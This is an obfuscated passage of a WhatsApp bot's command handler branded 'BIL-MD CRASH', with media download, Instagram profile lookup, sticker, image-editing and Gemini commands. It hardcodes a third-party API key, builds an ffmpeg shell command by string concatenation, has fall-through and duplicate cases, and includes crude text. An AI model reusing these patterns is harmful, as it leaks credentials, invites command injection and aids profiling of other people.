            ..._0x134d04
          };
          const _0x22d96e = await _0x770315(_0x21f0d9.chat, {
            viewOnceMessageV2Extension: {
              message: {
                messageContextInfo: {
                  deviceListMetadata: {},
                  deviceListMetadataVersion: 2
                },
                interactiveMessage: _0xda26e2.Message.InteractiveMessage.fromObject({
                  body: _0xda26e2.Message.InteractiveMessage.Body.fromObject({
                    text: "I am Marx"
                  }),
                  carouselMessage: _0xda26e2.Message.InteractiveMessage.CarouselMessage.fromObject({
                    cards: [{
                      header: _0xda26e2.Message.InteractiveMessage.Header.fromObject(_0x1a459b),
                      nativeFlowMessage: _0xda26e2.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                        buttons: [{
                          name: "single_select",
                          buttonParamsJson: "{\n                                                    \"title\": \"© MARX \",\n                                                    \"sections\": [{\n                                                        \"title\": \" ⽶ | t.me/xinnr9 \",\n                                                        \"highlight_label\": \"XinXcZ ᝄ\",\n                                                        \"rows\": [{\n                                                            \"header\": \"Click To Popup Menu\",\n                                                            \"title\": \"̟\",\n                                                            \"id\": \".xmenu\"\n                                                        }]\n                                                    }]\n                                                }"
                        }]
                      })
                    }]
                  })
                })
              }
            }
          }, {
            userJid: _0x21f0d9.sender,
            quoted: _0x597b72
          });
          console.log("Generated message:", _0x22d96e);
          await _0x4b53e5.relayMessage(_0x21f0d9.chat, _0x22d96e.message, {
            messageId: _0x22d96e.key.id
          });
        }
        break;
      case "mediafire":
        {
          if (!_0x40d288) {
            return _0x3b9923("*Example :* \n\n*Tiktokdl Link Url*");
          }
          if (!_0x40d288.includes("mediafire.com")) {
            return _0x3b9923("Url Tidak Mengandung Result Dari Mediafire!");
          }
          _0x3b9923(mess.wait);
          try {
            let _0x41269d = await fetch("https://api.betabotz.eu.org/api/download/mediafire?url=" + _0x40d288 + "&apikey=TheGetsuzoZhiro");
            let _0x18f6f5 = await _0x41269d.json();
            if (!_0x18f6f5.result) {
              return _0x3b9923("Failed to fetch MediaFire data or invalid response from API!");
            }
            const {
              url: _0x118b12,
              filename: _0x12feb5,
              ext: _0xc9c593,
              upload_date: _0xc49a27,
              filesizeH: _0x539ed5
            } = _0x18f6f5.result;
            const _0x21dc85 = {
              url: _0x118b12
            };
            const _0x1eb182 = {
              document: _0x21dc85,
              caption: gris + "[M E D I A  F I R E]" + gris + "\n\n" + hiasan + "*NAMA : " + _0x12feb5 + "*\n" + hiasan + "*FILETYPE : " + _0xc9c593 + "*\n" + hiasan + "*DATE : " + _0xc49a27 + "*\n" + hiasan + "*SIZE : " + _0x539ed5 + "*\n\n~©BIL-MD CRASH 🔥🐉~",
              fileName: _0x12feb5,
              mimetype: _0xc9c593
            };
            const _0x1108d8 = {
              quoted: _0x21b594
            };
            _0x4b53e5.sendMessage(_0x21f0d9.chat, _0x1eb182, _0x1108d8);
          } catch (_0x11f2a8) {
            console.error("Error:", _0x11f2a8);
            _0x3b9923("An error occurred while processing the request!");
          }
        }
        break;
      case "stalkig":
        {
          _0x3b9923(mess.wait);
          await _0x4b53e5.sendMessage(_0x21f0d9.chat, {
            react: {
              text: "⚡",
              key: _0x21f0d9.key
            }
          });
          try {
            let _0x4c4b53 = _0x21f0d9.text.slice(8).trim();
            if (_0x4c4b53 === "") {
              _0x3b9923("*Example :* \n\n*Stalkig Username IG*");
            } else {
              let {
                data: _0x89d500
              } = await axios.get("https://api.betabotz.eu.org/api/stalk/ig?username=" + encodeURIComponent(_0x4c4b53) + "&apikey=TheGetsuzoZhiro");
              if (_0x89d500.status === true && _0x89d500.result) {
                let _0x337e34 = gris + "[ I N S T A G R A M ]" + gris + "\n\n*Username : " + _0x89d500.result.username + "*\n*Full Name : " + _0x89d500.result.fullName + "*\n*Bio : " + _0x89d500.result.bio + "*\n*Followers : " + _0x89d500.result.followers + "*\n*Following : " + _0x89d500.result.following + "*\n*Posts : " + _0x89d500.result.postsCount + "*";
                const _0x4aa5fe = {
                  url: _0x89d500.result.photoUrl
                };
                const _0x3ee68e = {
                  image: _0x4aa5fe,
                  caption: _0x337e34
                };
                const _0x5df720 = {
                  quoted: _0x21b594
                };
                await _0x4b53e5.sendMessage(_0x21f0d9.chat, _0x3ee68e, _0x5df720);
              } else {
                _0x3b9923("Terjadi Kesalahan Dalam Pengambilan Data.");
              }
            }
          } catch (_0x3d7b6d) {
            _0x3b9923("Terjadi Kesalahan Dalam Koneksi Atau Pengambilan Data.");
          }
        }
        break;
      case "button":
        {
          if (!_0x3d405c) {
            return _0x3b9923(Testing);
          }
          const _0x56f938 = {
            upload: _0x4b53e5.waUploadToServer
          };
          let _0x4af910 = await prepareWAMessageMedia({
            image: _0x4d1a4f.readFileSync("./marx/anjay.jpg")
          }, _0x56f938);
          let _0x2879ff = _0x21f0d9.message;
          const _0x129867 = {
            hasMediaAttachment: true,
            ..._0x4af910
          };
          const _0x40c55a = await _0x770315(_0x21f0d9.chat, {
            viewOnceMessageV2Extension: {
              message: {
                messageContextInfo: {
                  deviceListMetadata: {},
                  deviceListMetadataVersion: 2
                },
                interactiveMessage: _0xda26e2.Message.InteractiveMessage.fromObject({
                  body: _0xda26e2.Message.InteractiveMessage.Body.fromObject({
                    text: "I am Marx"
                  }),
                  carouselMessage: _0xda26e2.Message.InteractiveMessage.CarouselMessage.fromObject({
                    cards: [{
                      header: _0xda26e2.Message.InteractiveMessage.Header.fromObject(_0x129867),
                      nativeFlowMessage: _0xda26e2.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                        buttons: [{
                          name: "single_select",
                          buttonParamsJson: "{\n                                                    \"title\": \"© MARX \",\n                                                    \"sections\": [{\n                                                        \"title\": \" ⽶ | t.me/xinnr9 \",\n                                                        \"highlight_label\": \"XinXcZ ᝄ\",\n                                                        \"rows\": [{\n                                                            \"header\": \"Click To Popup Menu\",\n                                                            \"title\": \"̟\",\n                                                            \"id\": \".xmenu\"\n                                                        }]\n                                                    }]\n                                                }"
                        }]
                      })
                    }]
                  })
                })
              }
            }
          }, {
            userJid: _0x21f0d9.sender,
            quoted: _0x2879ff
          });
          await _0x4b53e5.relayMessage(_0x21f0d9.chat, _0x40c55a.message, {
            messageId: _0x40c55a.key.id
          });
        }
      case "test":
        {
          const _0x1e0dca = {
            upload: _0x4b53e5.waUploadToServer
          };
          let _0x5cf252 = _0x770315(_0x21f0d9.chat, {
            viewOnceMessage: {
              message: {
                messageContextInfo: {
                  isForwarded: true
                },
                interactiveMessage: _0xda26e2.Message.InteractiveMessage.create({
                  contextInfo: {
                    mentionedJid: [_0x21f0d9.sender],
                    isForwarded: true
                  },
                  header: _0xda26e2.Message.InteractiveMessage.Header.create({
                    title: "𝐂𝐇𝐔𝐂𝐊𝐘-𝛁𝟕",
                    hasMediaAttachment: true,
                    ...(await prepareWAMessageMedia({
                      image: await _0x4d1a4f.readFileSync("./database/image/xbug.jpg")
                    }, _0x1e0dca))
                  }),
                  body: _0xda26e2.Message.InteractiveMessage.Body.create({
                    text: "WAGWAN BITCH"
                  }),
                  footer: _0xda26e2.Message.InteractiveMessage.Footer.create({
                    text: ""
                  }),
                  nativeFlowMessage: _0xda26e2.Message.InteractiveMessage.NativeFlowMessage.create({
                    buttons: [{
                      name: "cta_url",
                      buttonParamsJson: "{\"display_text\":\"𝐂𝐇𝐔𝐂𝐊𝐘-𝛁𝟕\",\"url\":\"https://t.me/only1marx\",\"merchant_url\":\"https://t.me/only1marx\"}"
                    }, {
                      name: "cta_url",
                      buttonParamsJson: "{\"display_text\":\"My Creator\",\"url\":\"https://t.me/only1marx\",\"merchant_url\":\"https://t.me/only1marx\"}"
                    }]
                  })
                })
              }
            }
          }, {});
          await _0x4b53e5.relayMessage(_0x5cf252.key.remoteJid, _0x5cf252.message, {
            messageId: _0x5cf252.key.id
          });
        }
        break;
      case "hd":
      case "remini":
        {
          const _0x492110 = require("sharp");
          async function _0x59240e(_0xd1a08c) {
            try {
              const _0x48a9a5 = path.join(__dirname, "temp_image_" + Date.now() + ".jpg");
              _0x4d1a4f.writeFileSync(_0x48a9a5, _0xd1a08c);
              await _0x492110(_0xd1a08c).resize({
                width: 1920,
                height: 1080,
                fit: "inside",
                withoutEnlargement: false
              }).sharpen().linear(1.2, -25.599999999999994).modulate({
                brightness: 0.98
              }).toFile(_0x48a9a5);
              await _0x4b53e5.sendMessage(_0x21f0d9.chat, {
                image: _0x4d1a4f.readFileSync(_0x48a9a5)
              });
              _0x4d1a4f.unlinkSync(_0x48a9a5);
            } catch (_0xe60b59) {
              console.error("Error processing image:", _0xe60b59);
            }
          }
          const _0x3f91c8 = await _0x21f0d9.quoted.download();
          return _0x59240e(_0x3f91c8);
        }
        break;
      case "upsound":
      case "upch":
      case "upaudio":
      case "upmp3":
        {
          if (!_0x39695a) {
            return;
          }
          if (!/video/.test(_0x5ed57c) && !/audio/.test(_0x5ed57c)) {
            return _0x3b9923("Reply Video/Vn Yang Ingin Dijadikan MP3 Dengan Caption " + (_0x3a5987 + _0x4ae68c));
          }
          if (!_0x88ec1) {
            return _0x3b9923("Reply Video/Vn Yang Ingin Dijadikan MP3 Dengan Caption " + (_0x3a5987 + _0x4ae68c));
          }
          await _0x4b53e5.sendMessage(_0x21f0d9.chat, {
            react: {
              text: "⏱️",
              key: _0x21f0d9.key
            }
          });
          _0x4b53e5.sendMessage("", {
            audio: await _0x88ec1.download(),
            viewOnce: false,
            ptt: true,
            mimetype: "audio/mpeg",
            fileName: "bot.mp3",
            waveform: [0, 153, 0, 494, 976]
          });
          await _0x4b53e5.sendMessage(_0x21f0d9.chat, {
            react: {
              text: "✅",
              key: _0x21f0d9.key
            }
          });
        }
        break;
      case "video":
        if (!hann2) {
          return _0x3b9923("Mana video sama perintahnya?");
        }
        const _0x47afef = genAI.getGenerativeModel({
          model: "gemini-1.5-pro"
        });
        const _0xce16bc = await _0x21f0d9.quoted.download();
        const _0x2eeeb9 = path.join(__dirname, "temp_video_" + Date.now() + ".mp4");
        _0x4d1a4f.writeFileSync(_0x2eeeb9, _0xce16bc);
        if (/video/.test(_0x5ed57c)) {
          const _0x33ed21 = await fileManager.uploadFile(_0x2eeeb9, {
            mimeType: "video/mp4",
            displayName: "temp_video_" + Date.now()
          });
          _0x4d1a4f.unlinkSync(_0x2eeeb9);
          console.log("Uploaded file " + _0x33ed21.file.displayName + " as: " + _0x33ed21.file.uri);
          const _0x757262 = {
            mimeType: _0x33ed21.file.mimeType,
            fileUri: _0x33ed21.file.uri
          };
          const _0x4d30ca = {
            fileData: _0x757262
          };
          const _0xd74244 = await _0x47afef.generateContent([_0x4d30ca, {
            text: "gunakan bahasa indonesia" + hann2
          }]);
          _0x3b9923(_0xd74244.response.text());
        } else {
          _0x3b9923("Reply to the video");
        }
        break;
      case "audio":
        if (!hann2) {
          return _0x3b9923("Mana audio sama perintahnya?");
        }
        const _0x2a4642 = genAI.getGenerativeModel({
          model: "gemini-1.5-flash"
        });
        const _0x52e704 = await _0x21f0d9.quoted.download();
        const _0x3af187 = _0x52e704.toString("base64");
        const _0xd9e87a = path.join(__dirname, "temp_audio_" + Date.now() + ".mp3");
        _0x4d1a4f.writeFileSync(_0xd9e87a, _0x52e704);
        if (/audio/.test(_0x5ed57c)) {
          const _0x32ee36 = await fileManager.uploadFile(_0xd9e87a, {
            mimeType: "audio/mp3"
          });
          console.log("Uploaded file " + _0x32ee36.file.uri);
          _0x4d1a4f.unlinkSync(_0xd9e87a);
          const _0x260372 = {
            mimeType: "audio/mp3",
            data: _0x3af187
          };
          const _0x17c3db = {
            inlineData: _0x260372
          };
          const _0x452994 = {
            text: hann2
          };
          const _0x2e6c6d = await _0x2a4642.generateContent([_0x17c3db, _0x452994]);
          _0x5297c5(_0x2e6c6d.response.text());
        } else {
          _0x3b9923("Reply/kirim audionya!");
        }
        break;
      case "image":
        if (!hann2) {
          return _0x3b9923("Mana image sama perintahnya?");
        }
        const _0x1649d1 = genAI.getGenerativeModel({
          model: "gemini-1.5-pro"
        });
        const _0x3e5ee6 = await _0x21f0d9.quoted.download();
        const _0x19d4e1 = path.join(__dirname, "temp_image_" + Date.now() + ".jpg");
        _0x4d1a4f.writeFileSync(_0x19d4e1, _0x3e5ee6);
        if (/image/.test(_0x5ed57c)) {
          const _0x568743 = await fileManager.uploadFile(_0x19d4e1, {
            mimeType: "image/jpeg",
            displayName: "temp_image_" + Date.now()
          });
          _0x4d1a4f.unlinkSync(_0x19d4e1);
          console.log("Uploaded file " + _0x568743.file.displayName + " as: " + _0x568743.file.uri);
          const _0x3f3606 = {
            mimeType: _0x568743.file.mimeType,
            fileUri: _0x568743.file.uri
          };
          const _0x59126e = {
            fileData: _0x3f3606
          };
          const _0x2f0896 = await _0x1649d1.generateContent([_0x59126e, {
            text: "gunakan bahasa indonesia" + hann2
          }]);
          _0x5297c5(_0x2f0896.response.text());
        } else {
          _0x3b9923("Reply to the image");
        }
        break;
      case "gsmarena":
        {
          const _0x50c8e8 = require("cheerio");
          if (_0x13e106.length === 0) {
            _0x3b9923("Silakan masukkan nama perangkat yang ingin dicari.");
            return;
          }
          async function _0x394d9f(_0x7cec93) {
            try {
              const _0x4a957b = await axios({
                method: "get",
                url: "https://gsmarena.com/results.php3?sQuickSearch=yes&sName=" + _0x7cec93
              });
              const _0x134df3 = _0x50c8e8.load(_0x4a957b.data);
              const _0x2d2459 = [];
              const _0x358455 = _0x134df3(".makers").find("li");
              _0x358455.each((_0x1226fc, _0x468014) => {
                const _0x3db078 = _0x134df3(_0x468014).find("img");
                _0x2d2459.push({
                  id: _0x134df3(_0x468014).find("a").attr("href").replace(".php", ""),
                  name: _0x134df3(_0x468014).find("span").html().split("<br>").join(" "),
                  description: _0x3db078.attr("title")
                });
              });
              return _0x2d2459;
            } catch (_0x466324) {
              console.error(_0x466324);
              throw _0x466324;
            }
          }
          _0x394d9f(q).then(_0x1e4549 => {
            if (_0x1e4549.length === 0) {
              _0x3b9923("No results found.");
              return;
            }
            let _0x41004a = "Hasil pencarian untuk \"" + q + "\":\n\n";
            _0x1e4549.forEach((_0x1f2b23, _0x226133) => {
              _0x41004a += _0x226133 + 1 + ". " + _0x1f2b23.name + "\nDeskripsi: " + _0x1f2b23.description + "\nLink: https://gsmarena.com/" + _0x1f2b23.id + ".php\n\n";
            });
            _0x3b9923(_0x41004a);
          }).catch(_0x206b83 => {
            _0x3b9923("Terjadi kesalahan saat mencari perangkat.");
            console.error(_0x206b83);
          });
        }
        break;
      case "soundtxt":
        {
          if (!q) {
            return _0x3b9923("Silakan Masukkan Teks Yang Ingin Diubah Menjadi Suara.");
          }
          _0x3b9923("Mengunduh Audio, Harap Tunggu...");
          try {
            let _0x3ba81d = encodeURIComponent(q.trim());
            let _0x1a1136 = "https://api.betabotz.eu.org/api/sound/texttosound?text1=" + q + "&lang=id-ID&apikey=TheGetsuzoZhiro";
            let _0x211e40 = await axios.get(_0x1a1136);
            if (_0x211e40.data.status) {
              let _0x1ccb8e = _0x211e40.data.result;
              const _0x5b1307 = {
                url: _0x1ccb8e
              };
              const _0x57cda9 = {
                audio: _0x5b1307,
                mimetype: "audio/mp4",
                ptt: true
              };
              await _0x4b53e5.sendMessage(_0x21f0d9.chat, _0x57cda9, {
                quoted: _0x21f0d9
              });
            } else {
              _0x3b9923("Gagal Mengunduh Audio. Silakan Coba Lagi Nanti.");
            }
          } catch (_0x2f0ac2) {
            _0x3b9923("Terjadi Kesalahan: " + String(_0x2f0ac2));
          }
        }
        break;
      case "sticker":
      case "stiker":
      case "s":
        {
          if (!_0x88ec1) {
            return _0x3b9923("Reply Video/Foto!!");
          }
          if (/image/.test(_0x5ed57c)) {
            let _0x175b4 = await _0x88ec1.download();
            const _0x215bd4 = {
              packname: global.packname,
              author: global.author
            };
            let _0x24606e = await _0x4b53e5.sendImageAsSticker(_0x21f0d9.chat, _0x175b4, _0x21b594, _0x215bd4);
          } else if (/video/.test(_0x5ed57c)) {
            if ((_0x88ec1.msg || _0x88ec1).seconds > 11) {
              return _0x3b9923("Maksimal 10 detik!");
            }
            let _0x64ea60 = await _0x88ec1.download();
            const _0x2796f2 = {
              packname: global.packname,
              author: global.author
            };
            let _0x19f4ce = await _0x4b53e5.sendVideoAsSticker(_0x21f0d9.chat, _0x64ea60, _0x21b594, _0x2796f2);
          } else {
            return _0x3b9923("Kirim Gambar/Video Dengan Caption " + (_0x3a5987 + _0x4ae68c) + "\nDurasi Video 1-9 Detik");
          }
        }
        break;
      case "smeme":
        {
          if (!_0x40d288) {
            return _0x3b9923("Reply Foto!!");
          }
          if (!_0x88ec1) {
            return _0x3b9923("Reply Foto!!");
          }
          if (/image/.test(_0x5ed57c)) {
            _0x3b9923(mess.wait);
            atas = _0x40d288.split("|")[0] ? _0x40d288.split("|")[0] : "-";
            bawah = _0x40d288.split("|")[1] ? _0x40d288.split("|")[1] : "-";
            let _0x5e3385 = await _0x4b53e5.downloadAndSaveMediaMessage(_0x4412d6);
            let _0x797e2b = await uptotelegra(_0x5e3385);
            let _0x2ec278 = "https://api.memegen.link/images/custom/" + encodeURIComponent(bawah) + "/" + encodeURIComponent(atas) + ".png?background=" + _0x797e2b;
            const _0x4a6952 = {
              packname: global.packname,
              author: global.author
            };
            let _0x5282aa = await _0x4b53e5.sendImageAsSticker(_0x21f0d9.chat, _0x2ec278, _0x21f0d9, _0x4a6952);
            _0x4d1a4f.unlinkSync(_0x5282aa);
          }
        }
        break;
      case "toimage":
      case "toimg":
        {
          if (!/webp/.test(_0x5ed57c)) {
            return _0x3b9923("Reply Sticker!!");
          }
          _0x3b9923(mess.wait);
          let _0x4eca8a = await _0x4b53e5.downloadAndSaveMediaMessage(_0x4412d6);
          let _0x511e2f = await _0x3da9a9(".png");
          exec("ffmpeg -i " + _0x4eca8a + " " + _0x511e2f, _0x16402a => {
            _0x4d1a4f.unlinkSync(_0x4eca8a);
            if (_0x16402a) {
              return _0x16402a;
            }
            let _0x32dd0e = _0x4d1a4f.readFileSync(_0x511e2f);
            const _0x539b4a = {
              image: _0x32dd0e
            };
            _0x4b53e5.sendMessage(_0x21f0d9.chat, _0x539b4a, {
              quoted: _0x21f0d9
            });
            _0x4d1a4f.unlinkSync(_0x511e2f);
          });
        }
        break;
      case "toaud":
      case "toaudio":
        {
          if (!/video/.test(_0x5ed57c) && !/audio/.test(_0x5ed57c)) {
            return _0x3b9923("Reply Video!!");
          }
          _0x3b9923(mess.wait);
          let _0xa6bacc = await _0x4b53e5.downloadMediaMessage(_0x4412d6);
          let _0x3a1f7b = await toAudio(_0xa6bacc, "mp4");
          const _0x485e79 = {
            audio: _0x3a1f7b,
            mimetype: "audio/mpeg"
          };
          _0x4b53e5.sendMessage(_0x21f0d9.chat, _0x485e79, {
            quoted: _0x21f0d9
          });
        }
        break;
      case "hdr":
        {
          if (!_0x88ec1) {
            return _0x3b9923("Reply Foto!!");
          }
          if (/image/.test(_0x5ed57c)) {
            _0x3b9923(mess.wait);
            let _0x3a4156 = await _0x4b53e5.downloadAndSaveMediaMessage(_0x4412d6);
            let _0x9ce719 = await uptotelegra(_0x3a4156);
            let _0x249180 = "https://api.betabotz.eu.org/api/tools/remini-v3?url=" + encodeURIComponent(_0x9ce719) + "&resolusi=4&apikey=TheGetsuzoZhiro";
            var _0x551542 = await _0x53139d(_0x249180);
            var _0x1eeed6 = _0x551542.url;
            const _0x1961f6 = {
              url: _0x1eeed6
            };
            const _0x59d042 = {
              image: _0x1961f6,
              caption: "𝐇𝐃𝐑 𝟒𝐊〽️"
            };
            const _0x4b6601 = {
              quoted: _0x21b594
            };
            await _0x4b53e5.sendMessage(_0x21f0d9.chat, _0x59d042, _0x4b6601);
          }
        }
        break;
      case "recolor":
        {
          if (!_0x88ec1) {
            return _0x3b9923("Reply Foto!!");
          }
          if (/image/.test(_0x5ed57c)) {
            _0x3b9923(mess.wait);
            let _0x55d00b = await _0x4b53e5.downloadAndSaveMediaMessage(_0x4412d6);
            let _0x1976cf = await uptotelegra(_0x55d00b);
            let _0x1b21a9 = "https://api.betabotz.eu.org/api/tools/recolor?url=" + encodeURIComponent(_0x1976cf) + "&apikey=TheGetsuzoZhiro";
            var _0x551542 = await _0x53139d(_0x1b21a9);
            var _0x1eeed6 = _0x551542.result;
            const _0x48d8aa = {
              url: _0x1eeed6
            };
            const _0x52c7f0 = {
              image: _0x48d8aa,
              caption: "𝐑𝐞𝐜𝐨𝐥𝐨𝐫🎭"
            };
            const _0x1899a2 = {
              quoted: _0x21b594
            };
            await _0x4b53e5.sendMessage(_0x21f0d9.chat, _0x52c7f0, _0x1899a2);
          }
        }
        break;
      case "removebg":
        {
          if (!_0x88ec1) {
            return _0x3b9923("Reply Foto!!");
          }
          if (/image/.test(_0x5ed57c)) {
            _0x3b9923(mess.wait);
            let _0x91082e = await _0x4b53e5.downloadAndSaveMediaMessage(_0x4412d6);
            let _0x406117 = await uptotelegra(_0x91082e);
            let _0x40afe3 = "https://api.betabotz.eu.org/api/tools/removebg?url=" + encodeURIComponent(_0x406117) + "&apikey=TheGetsuzoZhiro";
            var _0x551542 = await _0x53139d(_0x40afe3);
            var _0x1eeed6 = _0x551542.url.result;
            const _0x25ef9a = {
              url: _0x1eeed6
            };
            const _0x405711 = {
              image: _0x25ef9a,
              caption: "𝐑𝐞𝐦𝐨𝐯𝐞 𝐁𝐆〽️"
            };
            const _0x455055 = {
              quoted: _0x21b594
            };
            await _0x4b53e5.sendMessage(_0x21f0d9.chat, _0x405711, _0x455055);
          }
        }
        break;
      case "hd":
        {
          if (!_0x88ec1) {
            return _0x3b9923("*Fotonya Mana?*");
          }
          if (!/image/.test(_0x5ed57c)) {
            return _0x3b9923("*Reply Foto!!*");
          }
          _0x3b9923(mess.wait);
          let _0x1556c5 = await _0x88ec1.download();
          let _0x5b51ec = await remini(_0x1556c5, "enhance");
          const _0x99874d = {
            image: _0x5b51ec,
            caption: "𝐔𝐥𝐭𝐫𝐚 𝐇𝐃〽️"
          };
          const _0xdd36d3 = {
            quoted: _0x21b594
          };
          await _0x4b53e5.sendMessage(_0x21f0d9.chat, _0x99874d, _0xdd36d3);
        }
        break;
      case "tourl":
        {
          if (!/video/.test(_0x5ed57c) && !/image/.test(_0x5ed57c)) {
            return _0x3b9923("*Send/Reply the Video/Image With Caption* " + (_0x3a5987 + _0x4ae68c));
          }
          if (!_0x88ec1) {
            return _0x3b9923("*Send/Reply the Video/Image Caption* " + (_0x3a5987 + _0x4ae68c));
          }
          let {
            UploadFileUgu: _0x58b279,
            webp2mp4File: _0xe4f86b,
            TelegraPh: _0x254262
          } = require("./system/lib/uploader");
          let _0x32c8e1 = await _0x4b53e5.downloadAndSaveMediaMessage(_0x88ec1);
          if (/image/.test(_0x5ed57c)) {
            let _0x314ac8 = await _0x254262(_0x32c8e1);
            let _0x553b34 = util.format(_0x314ac8);
            wek = "\"" + util.format(_0x314ac8) + "\"";
            const _0x4a115d = {
              text: wek
            };
            const _0x2cca6c = {
              text: packname
            };
            let _0x5d1b1b = _0x770315(_0x21f0d9.chat, {
              viewOnceMessage: {
                message: {
                  messageContextInfo: {
                    deviceListMetadata: {},
                    deviceListMetadataVersion: 2
                  },
                  interactiveMessage: _0xda26e2.Message.InteractiveMessage.create({
                    contextInfo: {
                      mentionedJid: [_0x21f0d9.sender],
                      isForwarded: true,
                      forwardedNewsletterMessageInfo: {
                        newsletterJid: global.xchannel.jid,
                        newsletterName: "BIL-MD CRASH 🔥🐉",
                        serverMessageId: -1
                      },
                      businessMessageForwardInfo: {
                        businessOwnerJid: _0x4b53e5.decodeJid(_0x4b53e5.user.id)
                      }
                    },
                    body: _0xda26e2.Message.InteractiveMessage.Body.create(_0x4a115d),
                    footer: _0xda26e2.Message.InteractiveMessage.Footer.create(_0x2cca6c),
                    header: _0xda26e2.Message.InteractiveMessage.Header.create({
                      title: "Hiii, @" + _0x21f0d9.sender.split("@")[0] + " Here is your TelegraPH.Link!\n",
                      subtitle: "BIL-MD CRASH 🔥🐉",
                      hasMediaAttachment: true,
                      ...(await prepareWAMessageMedia({
                        image: {
                          url: "" + util.format(_0x314ac8)
                        }
                      }, {
                        upload: _0x4b53e5.waUploadToServer
                      }))
                    }),
                    nativeFlowMessage: _0xda26e2.Message.InteractiveMessage.NativeFlowMessage.create({
                      buttons: [{
                        name: "cta_copy",
                        buttonParamsJson: "{\"display_text\":\"Copy Url\",\"id\":\"123456789\",\"copy_code\":\"" + _0x553b34 + "\"}"
                      }]
                    })
                  })
                }
              }
            }, {});
            const _0x26185e = {
              quoted: _0x21f0d9
            };
            await _0x4b53e5.relayMessage(_0x5d1b1b.key.remoteJid, _0x5d1b1b.message, {
              messageId: _0x5d1b1b.key.id
            }, _0x26185e);
          }
        }
        break;
      case "tovn":
        {
          _0x3b9923(" command received ");
          if (!/video/.test(_0x5ed57c) && !/audio/.test(_0x5ed57c)) {
            return _0x3b9923("reply video/vn with caption " + (_0x3a5987 + _0x4ae68c));
          }
          if (!_0x88ec1) {
            return _0x3b9923("reply video/vn with caption " + (_0x3a5987 + _0x4ae68c));
          }
          await _0x96020a(5000);
          let _0x43faf2 = await _0x88ec1.download();
          let {
            toAudio: _0x40bf14
          } = require("./lib/converter");
          let _0x2ce438 = await _0x40bf14(_0x43faf2, "mp4");
          const _0x24a616 = {
            audio: _0x2ce438,
            mimetype: "audio/mpeg",
            ptt: true
          };
          client.sendMessage(_0x21f0d9.chat, _0x24a616, {
            quoted: _0x21f0d9
          });
        }
        break;
      case "ssweb":
        {
          if (!_0x40d288) {
            return _0x3b9923("*Example: \nSspc Link");
          }
          let _0x3df8f6 = await _0x213f21(_0x40d288, "desktop");
          _0x4b53e5.sendFile(_0x21f0d9.chat, _0x3df8f6.result, "", "", _0x21f0d9, false);
        }
        break;
      case "tagall":
        {
          if (!_0x16cb12) {
            return _0x3b9923(mess.only.group);
          }
          if (!q) {
            return _0x3b9923("ADD A MESSAGE");
          }
          let _0x5c7db7 = (q ? q : "") + 